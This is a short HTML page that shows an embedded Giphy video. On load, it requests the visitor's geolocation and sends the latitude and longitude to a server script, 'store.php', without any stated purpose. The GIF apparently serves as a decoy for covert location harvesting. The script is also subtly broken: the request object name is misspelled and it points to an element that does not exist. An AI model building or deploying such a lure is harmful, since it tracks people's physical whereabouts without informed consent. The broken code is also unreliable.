<!DOCTYPE html>
<html>
<body onload="getLocation()">

<div style="width:480px"><iframe allow="fullscreen" frameBorder="0" height="199" src="https://giphy.com/embed/Mn3TGtX3LLZEOWoQ7u/video" width="480"></iframe></div>
<script>
var x = document.getElementById("demo");
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) 
{
  const xhttp = new XHMLhttpRequest();
  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
  xhttp.send();
}
</script>
</body>
</html>
